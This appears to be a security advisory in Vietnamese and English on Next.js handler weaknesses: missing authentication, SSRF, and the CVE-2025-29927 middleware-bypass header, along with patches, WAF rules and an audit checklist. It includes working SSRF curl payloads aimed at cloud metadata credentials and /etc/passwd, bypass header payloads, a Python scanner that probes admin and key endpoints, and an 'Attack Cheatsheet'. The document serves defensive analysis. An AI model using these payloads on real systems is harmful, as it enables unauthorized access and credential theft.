# Security Analysis: Handler Vulnerability Assessment

## Executive Summary

Phân tích này đánh giá 3 vector tấn công chính liên quan đến handlers không được bảo vệ đúng cách:

| Attack Vector | Risk Level | Impact |
|---------------|------------|--------|
| Handler không check gì | 🔴 CRITICAL | Toàn quyền truy cập |
| Handler có outbound (fetch/proxy) | 🟠 HIGH | SSRF - Server Side Request Forgery |
| Handler thao tác infra (keys/config) | 🔴 CRITICAL | System takeover via `X-Middleware-Subrequest` bypass |

---

## 1. Handler Không Check Gì - Toàn Quyền Truy Cập

### Mô tả
Handlers/routes được expose mà không có bất kỳ authentication hoặc authorization check nào.

### Vulnerable Pattern

```javascript
// ❌ VULNERABLE: No authentication check
export async function GET(request) {
  const users = await db.query('SELECT * FROM users');
  return Response.json(users);
}

// ❌ VULNERABLE: API route without middleware protection
// pages/api/admin/users.js
export default function handler(req, res) {
  // Direct database access without auth
  const data = getAdminData();
  res.json(data);
}
```

### Secure Pattern

```javascript
// ✅ SECURE: With authentication check
export async function GET(request) {
  const session = await getSession(request);
  if (!session || !session.user) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 });
  }

  if (!hasRole(session.user, 'admin')) {
    return Response.json({ error: 'Forbidden' }, { status: 403 });
  }

  const users = await db.query('SELECT * FROM users');
  return Response.json(users);
}
```

### Detection Checklist

- [ ] Tất cả API routes có authentication middleware?
- [ ] Có authorization check cho từng action?
- [ ] Session validation được thực hiện?
- [ ] Rate limiting có được áp dụng?

---

## 2. Handler Có Outbound (Fetch/Proxy) - SSRF Vulnerability

### Mô tả
Server Side Request Forgery (SSRF) xảy ra khi attacker có thể kiểm soát URL mà server fetch.

### Vulnerable Pattern

```javascript
// ❌ VULNERABLE: User-controlled URL without validation
export async function GET(request) {
  const url = request.nextUrl.searchParams.get('url');

  // Direct fetch without validation - SSRF!
  const response = await fetch(url);
  const data = await response.text();

  return Response.json({ data });
}
```

### Attack Scenarios

```bash
# Access internal services
curl "https://app.com/api/proxy?url=http://localhost:3000/admin"

# Access cloud metadata (AWS)
curl "https://app.com/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Access internal network
curl "https://app.com/api/proxy?url=http://10.0.0.1:8080/internal-api"

# File protocol (if supported)
curl "https://app.com/api/proxy?url=file:///etc/passwd"
```

### Secure Pattern

```javascript
// ✅ SECURE: URL validation and allowlist
const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.example.com'];

export async function GET(request) {
  const url = request.nextUrl.searchParams.get('url');

  // Parse and validate URL
  let parsedUrl;
  try {
    parsedUrl = new URL(url);
  } catch {
    return Response.json({ error: 'Invalid URL' }, { status: 400 });
  }

  // Block internal IPs
  const hostname = parsedUrl.hostname;
  if (isInternalIP(hostname)) {
    return Response.json({ error: 'Forbidden' }, { status: 403 });
  }

  // Allowlist check
  if (!ALLOWED_DOMAINS.includes(hostname)) {
    return Response.json({ error: 'Domain not allowed' }, { status: 403 });
  }

  // Only allow HTTPS
  if (parsedUrl.protocol !== 'https:') {
    return Response.json({ error: 'HTTPS required' }, { status: 400 });
  }

  const response = await fetch(url);
  return Response.json({ data: await response.text() });
}

function isInternalIP(hostname) {
  const internalPatterns = [
    /^localhost$/i,
    /^127\./,
    /^10\./,
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
    /^192\.168\./,
    /^169\.254\./,  // AWS metadata
    /^0\./,
    /^\[::1\]$/,
  ];
  return internalPatterns.some(pattern => pattern.test(hostname));
}
```

---

## 3. X-Middleware-Subrequest Bypass (CVE-2025-29927)

### Mô tả

Next.js sử dụng header `X-Middleware-Subrequest` để ngăn infinite loops trong middleware. Attacker có thể abuse header này để bypass middleware authentication hoàn toàn.

### Vulnerability Details

| Aspect | Details |
|--------|---------|
| CVE | CVE-2025-29927 |
| Affected | Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5 |
| CVSS | 9.1 (Critical) |
| Attack Complexity | Low |

### How It Works

```
Normal Request Flow:
Client → Middleware (auth check) → Handler

Bypass Flow:
Client + X-Middleware-Subrequest → [Middleware SKIPPED] → Handler
```

### Attack Payload

```bash
# Basic bypass
curl -H "X-Middleware-Subrequest: middleware" https://target.com/admin

# For older versions - repeated middleware name
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
  https://target.com/admin

# With specific middleware path
curl -H "X-Middleware-Subrequest: src/middleware" https://target.com/api/admin/users

# Common middleware locations to try
curl -H "X-Middleware-Subrequest: pages/_middleware" https://target.com/admin
curl -H "X-Middleware-Subrequest: middleware" https://target.com/admin
curl -H "X-Middleware-Subrequest: src/middleware" https://target.com/admin
```

### Exploitation Script

```python
#!/usr/bin/env python3
"""
CVE-2025-29927 Next.js Middleware Bypass Scanner
"""

import requests
from urllib.parse import urljoin

class MiddlewareBypassScanner:
    PAYLOADS = [
        "middleware",
        "middleware:middleware:middleware:middleware:middleware",
        "src/middleware",
        "pages/_middleware",
        "app/middleware",
    ]

    SENSITIVE_PATHS = [
        "/admin",
        "/api/admin",
        "/api/users",
        "/api/config",
        "/api/keys",
        "/dashboard",
        "/internal",
        "/_next/data",
    ]

    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def scan(self):
        results = []

        for path in self.SENSITIVE_PATHS:
            url = urljoin(self.base_url, path)

            # Normal request (should be blocked by middleware)
            normal_resp = self.session.get(url)

            for payload in self.PAYLOADS:
                # Bypass request
                bypass_resp = self.session.get(
                    url,
                    headers={"X-Middleware-Subrequest": payload}
                )

                # Check if bypass successful
                if self._is_bypass_successful(normal_resp, bypass_resp):
                    results.append({
                        "path": path,
                        "payload": payload,
                        "normal_status": normal_resp.status_code,
                        "bypass_status": bypass_resp.status_code,
                        "vulnerable": True
                    })

        return results

    def _is_bypass_successful(self, normal, bypass):
        # Bypass indicators
        if normal.status_code in [401, 403, 302] and bypass.status_code == 200:
            return True
        if len(bypass.content) > len(normal.content) * 2:
            return True
        return False

# Usage
if __name__ == "__main__":
    scanner = MiddlewareBypassScanner("https://target.com")
    vulnerabilities = scanner.scan()

    for vuln in vulnerabilities:
        print(f"[VULNERABLE] {vuln['path']}")
        print(f"  Payload: {vuln['payload']}")
        print(f"  Status: {vuln['normal_status']} → {vuln['bypass_status']}")
```

### Impact on Infrastructure Handlers

Khi bypass middleware thành công, attacker có thể:

```javascript
// Handler thao tác keys - BỊ EXPOSED
// /api/admin/rotate-keys
export async function POST(request) {
  // Middleware auth bypassed - attacker can access!
  await rotateAPIKeys();
  return Response.json({ success: true });
}

// Handler thao tác config - BỊ EXPOSED
// /api/admin/config
export async function PUT(request) {
  const { config } = await request.json();
  await updateSystemConfig(config);
  return Response.json({ success: true });
}

// Handler deploy - BỊ EXPOSED
// /api/admin/deploy
export async function POST(request) {
  const { version } = await request.json();
  await triggerDeployment(version);
  return Response.json({ success: true });
}
```

---

## 4. Mitigation Strategies

### 4.1 Update Next.js

```bash
# Update to patched version
npm update next@latest

# Verify version
npx next --version
# Should be >= 15.2.3, >= 14.2.25, >= 13.5.9, or >= 12.3.5
```

### 4.2 Block Header at Edge/WAF

```nginx
# Nginx - Block the header
location / {
    if ($http_x_middleware_subrequest) {
        return 403;
    }
    proxy_pass http://nextjs_backend;
}
```

```yaml
# Cloudflare WAF Rule
expression: |
  http.request.headers["x-middleware-subrequest"][0] ne ""
action: block
```

### 4.3 Defense in Depth - Handler-Level Auth

```javascript
// ALWAYS verify auth in handlers, not just middleware
export async function GET(request) {
  // Even if middleware is bypassed, handler still checks auth
  const session = await verifySession(request);
  if (!session) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 });
  }

  // Proceed with handler logic
}
```

### 4.4 Security Headers Configuration

```javascript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'X-Middleware-Subrequest',
            value: '', // Strip the header
          },
        ],
      },
    ];
  },
};
```

---

## 5. Security Audit Checklist

### Pre-Deployment

- [ ] Next.js version >= 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5
- [ ] All API routes have handler-level authentication
- [ ] SSRF protection on all outbound fetch operations
- [ ] WAF/Edge rules to block `X-Middleware-Subrequest`
- [ ] Rate limiting implemented
- [ ] Input validation on all endpoints

### Monitoring

- [ ] Log and alert on `X-Middleware-Subrequest` header presence
- [ ] Monitor for unusual access patterns to admin endpoints
- [ ] Track failed authentication attempts
- [ ] Alert on internal IP access attempts (SSRF)

---

## 6. Quick Reference - Attack Cheatsheet

```bash
# 1. Test for unprotected handlers
curl -v https://target.com/api/admin/users

# 2. Test SSRF
curl "https://target.com/api/proxy?url=http://169.254.169.254/latest/meta-data/"

# 3. Test middleware bypass (CVE-2025-29927)
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
  https://target.com/api/admin/config

# 4. Combined attack - bypass + SSRF
curl -H "X-Middleware-Subrequest: middleware" \
  "https://target.com/api/fetch?url=http://localhost:3000/api/internal/keys"
```

---

## References

- [CVE-2025-29927 - Next.js Middleware Bypass](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
- [Next.js Security Advisory](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

---

*Document generated for security analysis purposes*
*Last updated: 2026-02-03*
